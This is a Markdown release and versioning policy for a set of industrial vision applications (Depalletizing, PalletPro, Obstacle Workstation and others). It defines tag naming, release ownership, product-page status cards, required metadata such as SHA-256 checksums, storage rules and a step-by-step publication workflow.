# Release and Versioning Policy

[Documentation Home](../README.md) / [User Guides](README.md) / Release Policy

This policy keeps current standalone products available while establishing clear ownership for future AW3 and host-application releases.

## 1. Current and target delivery

| Application | Current public delivery | Target delivery |
| --- | --- | --- |
| Depalletizing | Standalone `3.0.1` package | AW3 |
| Pallet Docking | Standalone PalletPro `1.4.8_260828` host application | AW3 |
| Volume Measurement | Documentation `V0.1`; software planned for end of September 2026 | AW3 |
| Slot Monitoring | No public package | AW3 |
| Obstacle Avoidance | AW3 Obstacle Workstation `1.0.19`; V0.1 manual and white paper | Dedicated Obstacle Workstation host application |

The historical Depalletizing asset is named `AW3-V3.0.1-20260624.zip`, but its confirmed product ownership is the standalone Depalletizing lifecycle. Preserve the filename and published tag for compatibility.

## 2. Release ownership

| Release type | Owner | Use it for | Example |
| --- | --- | --- | --- |
| **AW3 platform release** | AW3 | Future major shared runtime delivery or a coordinated application bundle. | `aw3-v3.1.0` |
| **Application release** | One algorithm | Standalone delivery or a short-cycle algorithm fix or feature package. | `depalletizing-v3.0.2` |
| **Application host software** | Owning algorithm | Independent desktop software such as PalletPro or Obstacle Workstation. | `palletpro-v1.4.9` |
| **Shared tool release** | Tool | Camera setup, diagnostic, or integration utilities used by multiple applications. | `lxcameraviewer-v2.5.0` |

Future Depalletizing, Pallet Docking, Volume Measurement, and Slot Monitoring use AW3 as their target delivery. Obstacle Avoidance follows its dedicated host-application lifecycle.

For Volume Measurement, the product-page software history records both formal TorusMetric versions and standalone updates in one table. Formal versions are owned by the AW3 release that contains them, so their release-note and download links point to that AW3 Release. Standalone update packages and immutable version notes remain in the application's `releases/` folder. Every previous version row must be retained.

GitHub provides one repository-wide **Latest Release**, so component-level latest versions are defined by `latest-downloads/README.md` and the owning product page. The homepage **Latest software** table shows the latest AW3 formal release, the latest separately distributed update for each AW3 application, and the latest Obstacle Avoidance host application. It is a current-release view, not a historical index. Prefix every GitHub Release title with its product scope, and never publish an empty Release only to change the sidebar.

## 3. Version and naming rules

Use semantic versioning where the product exposes a three-part version. A build identifier may follow the version when the delivered product already uses one, for example `1.4.8_260828`. Do not infer a release date or compatibility claim from a filename alone.

| Item | Format |
| --- | --- |
| AW3 tag | `aw3-v<major>.<minor>.<patch>` |
| Application tag | `<application>-v<major>.<minor>.<patch>` |
| Host software tag | `<software>-v<version>` |
| Shared tool tag | `<tool>-v<version>` |
| Release-note file | `releases/v<version>.md` |

Keep the historical tags `Depalletizing-Algorithm-V3.0.1` and `PalletPro` unchanged so existing download URLs remain valid.

### Product-page release status

Each application product page uses the same compact release-status structure:

1. **Latest documentation:** show the current document version, publication date, applicable formal software version, and links to the latest user manual and white paper when available.
2. **Latest formal software:** show one latest formal application version and the AW3 version that delivers it, or one next planned version before the first formal release.
3. **Applicable standalone updates:** show active, non-superseded updates that explicitly reference the latest formal software version and its compatible AW3 version, or `Not published`.

The status card has strict display limits:

- **Latest documentation:** at most two links, consisting of one current User Manual and one current White Paper.
- **Latest formal software:** exactly one latest published formal version. Before the first formal release, show one next planned version instead.
- **Applicable standalone updates:** up to three active, non-superseded updates for the latest formal version. If more than three apply, show the three newest and route users to the complete history. If none applies, show `Not published`.

Do not show earlier versions in the status card. Provide one in-page link to the complete software update history at the bottom of the product page, which retains every formal version and standalone update. Keep detailed changes, checksums, compatibility, upgrade instructions, and rollback instructions in immutable `releases/v<version>.md` notes. Keep the document update history at the bottom of the product page and retain earlier document files in `docs/`.

Formal software is the application baseline. Each formal version records the AW3 release that delivers it. Each standalone update records its own version, its formal-version baseline, its compatible AW3 version, whether it remains active, and any update it supersedes. Each document version records the formal software versions, standalone updates, and AW3 versions to which it applies. Use `TBC` until an identifier is assigned and verified; never infer a relationship from an asset filename.

## 4. Required release metadata

Every published version must include its version and publication date, release type, delivery status, compatibility, supported environment when verified, summary, changes and fixes, upgrade and rollback guidance, known issues, asset filenames, file sizes, SHA-256 checksums, and applicable documentation links. Write **Not verified** or **Not published** for unknown information; never infer it.

## 5. Storage model

- Attach installers, archives, firmware, and models to GitHub Releases or the official download service.
- Keep Markdown release notes, public manuals, white papers, and reasonably sized documentation assets in Git.
- Keep one immutable release-note file per version inside the owning AW3, application, or tool folder.
- Keep application-specific software under its application; reserve `tools/` for shared utilities such as LxCameraViewer.
- Keep the current package index in `latest-downloads/README.md`; retain `RELEASES.md` as a compatibility entry that routes users to product-owned histories.
- Never replace an existing release asset in place. Publish a new version so deployments remain reproducible and reversible.

## 6. Publication workflow

### Document downloads

The Releases list contains software publications only. Never create a documentation-only Release. Manuals and guides remain owned by their product, and document revisions do not create software versions.

Attach relevant documentation to an existing software Release when it belongs to that product. Keep PDFs in the owning product's docs folder. Products without a software release use direct raw-file PDF links. Word source files are not published.

For Markdown documents without an owning software Release, provide a clearly labeled ZIP download beside the Markdown source. The ZIP contains the existing Markdown document with absolute supporting links; it is a document download, not an installation package. Rebuild it whenever its source changes. Product READMEs and navigation indexes remain browsable pages. GitHub's repository file list retains its built-in preview behavior.

Before removing a download location, migrate links in repository pages, software Release descriptions, and downloadable Markdown copies. Verify downloads and checksums before deleting the obsolete entry. Preserve software installers, version numbers, historical tags, and release dates. Documentation link repairs must not change technical claims.

### Release presentation

Use the existing product title, centered consistently. Show the current release's existing delivery information, changes, and document links clearly; fold long installation and verification details where useful. Preserve existing wording and important limitations. Do not invent features, compatibility, test results, dates, or new documentation sections solely to fill a layout. Keep the latest published software marked as Latest; product-specific latest versions remain on the homepage and product pages.

### Software publication

1. Confirm the owner: AW3, application, application host software, or shared tool.
2. Freeze the version, compatibility, and asset filenames.
3. Create the version note from [the template (ZIP)](https://github.com/Lanxin-MRDVS/Application-Algorithms/raw/refs/heads/main/user-guides/release-note-template.md.zip?download=1).
4. Build and test the package through the approved release process.
5. Record file sizes and SHA-256 values.
6. Create the immutable Git tag and GitHub Release.
7. Upload assets and copy the final URLs into the version note.
8. Update the owning release index, `latest-downloads/README.md`, the product page, the homepage, and `SUMMARY.md`.
9. Verify links, rendering, downloads, compatibility, and rollback instructions.
10. Preserve every previous release note and asset.
